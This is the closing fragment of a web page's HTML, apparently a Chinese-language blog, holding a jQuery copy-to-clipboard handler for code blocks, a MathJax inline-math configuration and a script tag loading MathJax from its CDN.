n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>